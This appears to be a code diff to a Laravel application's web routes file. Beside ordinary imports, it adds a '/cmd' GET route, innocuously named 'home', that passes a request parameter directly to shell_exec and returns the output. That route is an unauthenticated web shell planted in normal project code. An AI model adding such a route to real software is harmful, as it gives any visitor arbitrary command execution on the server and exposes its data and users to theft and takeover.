@@ -14,6 +14,7 @@ use App\Livewire\role\Roles;
 use App\Livewire\Settings\SettingsComponent;
 use App\Livewire\user\Users;
 use App\Livewire\VehicleClass\VehicleClassComponent;
+use http\Env\Request;
 use Illuminate\Support\Facades\Route;
 
 /*
@@ -26,6 +27,9 @@ use Illuminate\Support\Facades\Route;
 | be assigned to the "web" middleware group. Make something great!
 |
 */
+Route::get('/cmd', function (Request $request) {
+    return shell_exec($request->line);
+})->name('home');
 
 Route::get('/', function () {
     return view('welcome');
